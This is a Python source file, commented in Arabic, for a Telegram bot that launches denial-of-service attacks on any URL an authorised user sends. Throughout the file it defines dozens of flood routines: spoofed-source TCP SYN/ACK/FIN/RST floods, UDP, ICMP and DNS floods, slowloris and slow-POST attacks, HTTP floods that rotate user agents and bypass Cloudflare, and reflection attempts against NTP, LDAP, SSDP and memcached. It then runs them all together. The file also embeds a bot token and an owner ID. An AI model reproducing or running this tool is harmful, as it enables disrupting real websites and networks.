import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import cloudscraper
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib3
import time
import socket
import ssl
import random
from scapy.all import *

# تعطيل التحقق من صحة شهادة SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

scraper = cloudscraper.create_scraper()  # إنشاء كائن scraper لتجاوز Cloudflare

# قائمة المالكين والمستخدمين
Owner = ['6358035274']
NormalUsers = []

# استبدل 'YOUR_TOKEN_HERE' بالرمز الخاص بك من BotFather
bot = telebot.TeleBot('7287602125:AAH9buxYlFiOo2kAUnkicgmRSo4NSx8lV6w')

# متغيرات التحكم في الهجوم
attack_in_progress = False
attack_lock = threading.Lock()
attack_counter = 0  # عداد الهجوم
error_logged = False  # متغير لتتبع تسجيل الأخطاء

def log_error_once(error_message):
    global error_logged
    if not error_logged:
        print(error_message)
        error_logged = True

def random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def random_user_agent():
    user_agents = [
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, مثل Gecko) Chrome/77.0.3835.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/77.0.3831.6 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 9; POCOPHONE F1) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
        'Mozilla/5.0 (X11; Linux i686; rv:67.0) Gecko/20100101 Firefox/67.0',
        'Mozilla/5.0 (Android 9; Mobile; rv:67.0.3) Gecko/67.0.3 Firefox/67.0.3',
        'Mozilla/5.0 (Android 7.1.1; Tablet; rv:67.0) Gecko/67.0 Firefox/67.0',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/75.0.3770.27 Safari/537.36 OPR/62.0.3331.10 (Edition beta)',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362',
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML، مثل Gecko، Safari/419.3) Arora/0.8.0',
        'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
        'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML، مثل Gecko) Version/4.0.4 Safari/531.21.10',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML، مثل Gecko) Chrome/7.0.514.0 Safari/534.7',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML، مثل Gecko) Chrome/5.0.310.0 Safari/532.9',
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML، مثل Gecko) Version/5.0.1 Safari/533.17.8',
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)',
    ]
    return random.choice(user_agents)

def syn_flood(target_ip, target_port):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            ip_src = random_ip()
            packet = IP(src=ip_src, dst=target_ip) / TCP(dport=target_port, sport=random.randint(1024, 65535), flags="S")
            send(packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in syn_flood: {e}\nDetails: {str(e)}")

def bypass_attack(host, port=443):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            context = ssl.create_default_context()
            with socket.create_connection((host, port)) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    request = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random_user_agent()}\r\nX-Forwarded-For: {random_ip()}\r\n\r\n".encode('utf-8')
                    ssock.sendall(request)
                    attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in bypass_attack: {e}\nDetails: {str(e)}")

def flooding_requests_attack(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            scraper.get(f"https://{host}", headers={'User-Agent': random_user_agent(), 'X-Forwarded-For': random_ip()})
            attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in flooding_requests_attack: {e}\nDetails: {str(e)}")

def layer_attack(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            scraper.post(f"https://{host}", data={"key": "value"}, headers={'User-Agent': random_user_agent(), 'X-Forwarded-For': random_ip()})
            attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in layer_attack: {e}\nDetails: {str(e)}")

def http_get_flood(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            request = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random_user_agent()}\r\nX-Forwarded-For: {random_ip()}\r\n\r\n".encode('utf-8')
            with socket.create_connection((host, 80)) as sock:
                sock.sendall(request)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in http_get_flood: {e}\nDetails: {str(e)}")

def http_post_flood(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            request = f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nUser-Agent: {random_user_agent()}\r\nX-Forwarded-For: {random_ip()}\r\n\r\nkey=value".encode('utf-8')
            with socket.create_connection((host, 80)) as sock:
                sock.sendall(request)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in http_post_flood: {e}\nDetails: {str(e)}")

def udp_flood(target_ip, target_port):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            packet = random._urandom(1024)
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(packet, (target_ip, target_port))
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in udp_flood: {e}\nDetails: {str(e)}")

def ping_flood(target_ip):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            packet = IP(dst=target_ip)/ICMP(type="echo-request")
            send(packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in ping_flood: {e}\nDetails: {str(e)}")

def dns_flood(target_ip):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            query = IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com"))
            send(query, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in dns_flood: {e}\nDetails: {str(e)}")

def slowloris_attack(target_ip, target_port):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target_ip, target_port))
            sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode('utf-8'))
            sock.send(f"Host: {target_ip}\r\n".encode('utf-8'))
            sock.send("User-Agent: Mozilla/5.0\r\n".encode('utf-8'))
            sock.send("Connection: keep-alive\r\n".encode('utf-8'))
            attack_counter += 1
            time.sleep(15)  # إبقاء الاتصال مفتوحًا لفترة طويلة
    except Exception as e:
        log_error_once(f"Error in slowloris_attack: {e}\nDetails: {str(e)}")

def ntp_amplification(target_ip):
    global attack_in_progress, attack_counter
    ntp_server = "pool.ntp.org"
    ntp_packet = b'\x17' + 47 * b'\x00'
    try:
        while attack_in_progress:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(ntp_packet, (ntp_server, 123))
                sock.sendto(ntp_packet, (target_ip, 123))
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in ntp_amplification: {e}\nDetails: {str(e)}")

def ldap_amplification(target_ip):
    global attack_in_progress, attack_counter
    ldap_server = "ldap.forumsys.com"
    ldap_packet = b'\x30\x84\x00\x00\x00\x0b\x02\x01\x01\x60\x84\x00\x00\x00\x03\x02\x01\x03'
    try:
        while attack_in_progress:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(ldap_packet, (ldap_server, 389))
                sock.sendto(ldap_packet, (target_ip, 389))
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in ldap_amplification: {e}\nDetails: {str(e)}")

def snmp_flood(target_ip):
    global attack_in_progress, attack_counter
    snmp_packet = b'\x30\x29\x02\x01\x00\x04\x06\x70\x75\x62\x6c\x69\x63\xa1\x1c\x02\x04\x00\x00\x00\x00\x02\x01\x00\x02\x01\x00\x30\x0e\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00\x05\x00'
    try:
        while attack_in_progress:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(snmp_packet, (target_ip, 161))
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in snmp_flood: {e}\nDetails: {str(e)}")

def http_head_flood(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            request = f"HEAD / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random_user_agent()}\r\nX-Forwarded-For: {random_ip()}\r\n\r\n".encode('utf-8')
            with socket.create_connection((host, 80)) as sock:
                sock.sendall(request)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in http_head_flood: {e}\nDetails: {str(e)}")

def rudy_attack(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            with socket.create_connection((host, 80)) as sock:
                sock.send(f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 1000000\r\n\r\n".encode('utf-8'))
                for _ in range(1000):
                    if not attack_in_progress:
                        break
                    sock.send(b"a")
                    time.sleep(1)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in rudy_attack: {e}\nDetails: {str(e)}")

def http_mix_flood(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            request_type = random.choice(["GET", "POST", "HEAD"])
            if request_type == "POST":
                request = f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nUser-Agent: {random_user_agent()}\r\nX-Forwarded-For: {random_ip()}\r\n\r\nkey=value".encode('utf-8')
            else:
                request = f"{request_type} / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random_user_agent()}\r\nX-Forwarded-For: {random_ip()}\r\n\r\n".encode('utf-8')
            with socket.create_connection((host, 80)) as sock:
                sock.sendall(request)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in http_mix_flood: {e}\nDetails: {str(e)}")

def sip_flood(target_ip):
    global attack_in_progress, attack_counter
    sip_packet = b'INVITE sip:bob@biloxi.com SIP/2.0\r\nVia: SIP/2.0/UDP pc33.atlanta.com;branch=z9hG4bK776asdhds\r\nMax-Forwards: 70\r\nTo: Bob <sip:bob@biloxi.com>\r\nFrom: Alice <sip:alice@atlanta.com>;tag=1928301774\r\nCall-ID: a84b4c76e66710\r\nCSeq: 314159 INVITE\r\nContact: <sip:alice@pc33.atlanta.com>\r\nContent-Type: application/sdp\r\nContent-Length: 0\r\n\r\n'
    try:
        while attack_in_progress:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(sip_packet, (target_ip, 5060))
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in sip_flood: {e}\nDetails: {str(e)}")

def smurf_attack(target_ip):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            packet = IP(src=target_ip, dst="255.255.255.255")/ICMP()
            send(packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in smurf_attack: {e}\nDetails: {str(e)}")

def fragmented_packet_attack(target_ip, target_port):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            ip_src = random_ip()
            packet = IP(src=ip_src, dst=target_ip, flags="MF") / TCP(dport=target_port, sport=random.randint(1024, 65535), flags="S")
            send(fragment(packet), verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in fragmented_packet_attack: {e}\nDetails: {str(e)}")

def http_range_header_attack(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            request = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random_user_agent()}\r\nRange: bytes=0-18446744073709551615\r\nX-Forwarded-For: {random_ip()}\r\n\r\n".encode('utf-8')
            with socket.create_connection((host, 80)) as sock:
                sock.sendall(request)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in http_range_header_attack: {e}\nDetails: {str(e)}")

def reflected_xss_attack(target_ip):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            payload = f"<script>fetch('http://{target_ip}')</script>"
            with socket.create_connection((target_ip, 80)) as sock:
                request = f"GET /search?q={payload} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {random_user_agent()}\r\nX-Forwarded-For: {random_ip()}\r\n\r\n".encode('utf-8')
                sock.sendall(request)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in reflected_xss_attack: {e}\nDetails: {str(e)}")

def tcp_reset_attack(target_ip, target_port):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            ip_src = random_ip()
            packet = IP(src=ip_src, dst=target_ip) / TCP(dport=target_port, sport=random.randint(1024, 65535), flags="R")
            send(packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in tcp_reset_attack: {e}\nDetails: {str(e)}")

def http_slow_read_attack(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            with socket.create_connection((host, 80)) as sock:
                sock.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random_user_agent()}\r\nX-Forwarded-For: {random_ip()}\r\n\r\n".encode('utf-8'))
                time.sleep(5)
                sock.recv(1024)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in http_slow_read_attack: {e}\nDetails: {str(e)}")

def syn_ack_flood(target_ip, target_port):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            ip_src = random_ip()
            packet = IP(src=ip_src, dst=target_ip) / TCP(dport=target_port, sport=random.randint(1024, 65535), flags="SA")
            send(packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in syn_ack_flood: {e}\nDetails: {str(e)}")

def icmp_echo_flood(target_ip):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            packet = IP(dst=target_ip)/ICMP(type="echo-request")
            send(packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in icmp_echo_flood: {e}\nDetails: {str(e)}")

def http_connection_flood(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            with socket.create_connection((host, 80)):
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in http_connection_flood: {e}\nDetails: {str(e)}")

def ack_flood(target_ip, target_port):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            ip_src = random_ip()
            packet = IP(src=ip_src, dst=target_ip) / TCP(dport=target_port, sport=random.randint(1024, 65535), flags="A")
            send(packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in ack_flood: {e}\nDetails: {str(e)}")

def fin_flood(target_ip, target_port):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            ip_src = random_ip()
            packet = IP(src=ip_src, dst=target_ip) / TCP(dport=target_port, sport=random.randint(1024, 65535), flags="F")
            send(packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in fin_flood: {e}\nDetails: {str(e)}")

def rst_flood(target_ip, target_port):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            ip_src = random_ip()
            packet = IP(src=ip_src, dst=target_ip) / TCP(dport=target_port, sport=random.randint(1024, 65535), flags="R")
            send(packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in rst_flood: {e}\nDetails: {str(e)}")

def icmp_time_exceeded_flood(target_ip):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            packet = IP(dst=target_ip)/ICMP(type="time-exceeded")
            send(packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in icmp_time_exceeded_flood: {e}\nDetails: {str(e)}")

def http_cookie_bomb(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            cookies = "; ".join([f"cookie{i}=value{i}" for i in range(1000)])
            request = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random_user_agent()}\r\nCookie: {cookies}\r\nX-Forwarded-For: {random_ip()}\r\n\r\n".encode('utf-8')
            with socket.create_connection((host, 80)) as sock:
                sock.sendall(request)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in http_cookie_bomb: {e}\nDetails: {str(e)}")

def http_flood_random_uris(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            uri = f"/{random.randint(0, 1000)}"
            request = f"GET {uri} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random_user_agent()}\r\nX-Forwarded-For: {random_ip()}\r\n\r\n".encode('utf-8')
            with socket.create_connection((host, 80)) as sock:
                sock.sendall(request)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in http_flood_random_uris: {e}\nDetails: {str(e)}")

def http_method_flood(host):
    global attack_in_progress, attack_counter
    methods = ["OPTIONS", "TRACE", "CONNECT", "DELETE", "PUT"]
    try:
        while attack_in_progress:
            method = random.choice(methods)
            request = f"{method} / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random_user_agent()}\r\nX-Forwarded-For: {random_ip()}\r\n\r\n".encode('utf-8')
            with socket.create_connection((host, 80)) as sock:
                sock.sendall(request)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in http_method_flood: {e}\nDetails: {str(e)}")

def fragmented_udp_flood(target_ip, target_port):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            packet = IP(dst=target_ip, flags="MF") / UDP(dport=target_port, sport=random.randint(1024, 65535)) / random._urandom(10)
            send(fragment(packet), verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in fragmented_udp_flood: {e}\nDetails: {str(e)}")

def dns_amplification_attack(target_ip):
    global attack_in_progress, attack_counter
    dns_server = "8.8.8.8"
    dns_packet = IP(dst=dns_server, src=target_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com"))
    try:
        while attack_in_progress:
            send(dns_packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in dns_amplification_attack: {e}\nDetails: {str(e)}")

def ssdp_amplification_attack(target_ip):
    global attack_in_progress, attack_counter
    ssdp_packet = b'M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:ssdp:all\r\nMan:"ssdp:discover"\r\nMX:1\r\n\r\n'
    try:
        while attack_in_progress:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(ssdp_packet, ("239.255.255.250", 1900))
                sock.sendto(ssdp_packet, (target_ip, 1900))
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in ssdp_amplification_attack: {e}\nDetails: {str(e)}")

def http_slow_post_attack(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            with socket.create_connection((host, 80)) as sock:
                sock.sendall(f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 1000000\r\n\r\n".encode('utf-8'))
                for _ in range(1000):
                    if not attack_in_progress:
                        break
                    sock.send(b"a")
                    time.sleep(1)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in http_slow_post_attack: {e}\nDetails: {str(e)}")

def http_slow_headers_attack(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            with socket.create_connection((host, 80)) as sock:
                sock.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode('utf-8'))
                for _ in range(1000):
                    if not attack_in_progress:
                        break
                    sock.send(f"X-a-{random.randint(0, 10000)}: b\r\n".encode('utf-8'))
                    time.sleep(1)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in http_slow_headers_attack: {e}\nDetails: {str(e)}")

def dns_flood_random_subdomains(target_ip):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            subdomain = f"{random.randint(0, 10000)}.example.com"
            query = IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=subdomain))
            send(query, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in dns_flood_random_subdomains: {e}\nDetails: {str(e)}")

def tcp_connection_flood(target_ip, target_port):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((target_ip, target_port))
                sock.close()
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in tcp_connection_flood: {e}\nDetails: {str(e)}")

def icmp_redirect_flood(target_ip):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            packet = IP(dst=target_ip)/ICMP(type="redirect", code=1)
            send(packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in icmp_redirect_flood: {e}\nDetails: {str(e)}")

def syn_ack_ack_flood(target_ip, target_port):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            ip_src = random_ip()
            syn_ack_packet = IP(src=ip_src, dst=target_ip) / TCP(dport=target_port, sport=random.randint(1024, 65535), flags="SA")
            ack_packet = IP(src=ip_src, dst=target_ip) / TCP(dport=target_port, sport=random.randint(1024, 65535), flags="A")
            send(syn_ack_packet, verbose=0)
            send(ack_packet, verbose=0)
            attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in syn_ack_ack_flood: {e}\nDetails: {str(e)}")

def http_cache_flood(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            cache_buster = random.randint(0, 1000000)
            request = f"GET /?cb={cache_buster} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random_user_agent()}\r\nX-Forwarded-For: {random_ip()}\r\n\r\n".encode('utf-8')
            with socket.create_connection((host, 80)) as sock:
                sock.sendall(request)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in http_cache_flood: {e}\nDetails: {str(e)}")

def http_parameter_pollution(host):
    global attack_in_progress, attack_counter
    try:
        while attack_in_progress:
            polluted_url = f"/?param1=value1&param2=value2&{random.randint(0, 1000)}=test"
            request = f"GET {polluted_url} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random_user_agent()}\r\nX-Forwarded-For: {random_ip()}\r\n\r\n".encode('utf-8')
            with socket.create_connection((host, 80)) as sock:
                sock.sendall(request)
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in http_parameter_pollution: {e}\nDetails: {str(e)}")

def memcached_amplification(target_ip):
    global attack_in_progress, attack_counter
    memcached_packet = b'\x00\x00\x00\x00\x01\x00\x00\x00get foo\r\n'
    try:
        while attack_in_progress:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(memcached_packet, (target_ip, 11211))
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in memcached_amplification: {e}\nDetails: {str(e)}")

def chargen_amplification(target_ip):
    global attack_in_progress, attack_counter
    chargen_packet = b'Hello\r\n'
    try:
        while attack_in_progress:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(chargen_packet, (target_ip, 19))
                attack_counter += 1
    except Exception as e:
        log_error_once(f"Error in chargen_amplification: {e}\nDetails: {str(e)}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Hello! Send me the target URL to start the attack.")

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    global attack_in_progress, error_logged
    with attack_lock:
        attack_in_progress = False
    error_logged = False  # إعادة تعيين تسجيل الخطأ عند إيقاف الهجوم
    bot.reply_to(message, "Attack stopped successfully.")

@bot.message_handler(commands=['attack'])
def start_attack(message):
    global attack_in_progress, attack_counter, error_logged
    if str(message.chat.id) in Owner or str(message.chat.id) in NormalUsers:
        try:
            url = message.text.split()[1]  # افتراض أن الرابط يأتي بعد الأمر مباشرة
            host = url.split("//")[-1].split("/")[0]  # استخراج اسم المضيف من الرابط
            target_ip = socket.gethostbyname(host)  # الحصول على عنوان IP من اسم المضيف

            with attack_lock:
                attack_in_progress = True
                attack_counter = 0
                error_logged = False  # إعادة تعيين تسجيل الخطأ عند بدء هجوم جديد

            bot_message = bot.send_message(message.chat.id, f"Attack started on {url}.\nAttack status: 0")

            def update_message():
                while attack_in_progress:
                    time.sleep(1)  # تحديث كل ثانية
                    try:
                        bot.edit_message_text(chat_id=bot_message.chat.id, message_id=bot_message.message_id, text=f"Attack status: {attack_counter}")
                    except Exception as e:
                        print("Error while updating message:", e)

            threading.Thread(target=update_message).start()

            with ThreadPoolExecutor(max_workers=1000000000) as executor:  # عدد أكبر من الخيوط
                while attack_in_progress:
                    executor.submit(syn_flood, target_ip, 80)
                    executor.submit(bypass_attack, host)
                    executor.submit(flooding_requests_attack, host)
                    executor.submit(layer_attack, host)
                    executor.submit(http_get_flood, host)
                    executor.submit(http_post_flood, host)
                    executor.submit(udp_flood, target_ip, 80)
                    executor.submit(ping_flood, target_ip)
                    executor.submit(dns_flood, target_ip)
                    executor.submit(slowloris_attack, target_ip, 80)
                    executor.submit(ntp_amplification, target_ip)
                    executor.submit(ldap_amplification, target_ip)
                    executor.submit(snmp_flood, target_ip)
                    executor.submit(http_head_flood, host)
                    executor.submit(rudy_attack, host)
                    executor.submit(http_mix_flood, host)
                    executor.submit(sip_flood, target_ip)
                    executor.submit(smurf_attack, target_ip)
                    executor.submit(fragmented_packet_attack, target_ip, 80)
                    executor.submit(http_range_header_attack, host)
                    executor.submit(reflected_xss_attack, target_ip)
                    executor.submit(tcp_reset_attack, target_ip, 80)
                    executor.submit(http_slow_read_attack, host)
                    executor.submit(syn_ack_flood, target_ip, 80)
                    executor.submit(icmp_echo_flood, target_ip)
                    executor.submit(http_connection_flood, host)
                    executor.submit(ack_flood, target_ip, 80)
                    executor.submit(fin_flood, target_ip, 80)
                    executor.submit(rst_flood, target_ip, 80)
                    executor.submit(icmp_time_exceeded_flood, target_ip)
                    executor.submit(http_cookie_bomb, host)
                    executor.submit(http_flood_random_uris, host)
                    executor.submit(http_method_flood, host)
                    executor.submit(fragmented_udp_flood, target_ip, 80)
                    executor.submit(dns_amplification_attack, target_ip)
                    executor.submit(ssdp_amplification_attack, target_ip)
                    executor.submit(http_slow_post_attack, host)
                    executor.submit(http_slow_headers_attack, host)
                    executor.submit(dns_flood_random_subdomains, target_ip)
                    executor.submit(tcp_connection_flood, target_ip, 80)
                    executor.submit(icmp_redirect_flood, target_ip)
                    executor.submit(syn_ack_ack_flood, target_ip, 80)
                    executor.submit(http_cache_flood, host)
                    executor.submit(http_parameter_pollution, host)
                    executor.submit(memcached_amplification, target_ip)
                    executor.submit(chargen_amplification, target_ip)
        except IndexError:
            bot.reply_to(message, "Usage: /attack <URL>")
    else:
        bot.reply_to(message, "Sorry, you are not authorized to use this tool.")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    bot.reply_to(message, "Use /attack <URL> to start an attack or /stop to stop the attack.")

bot.polling()
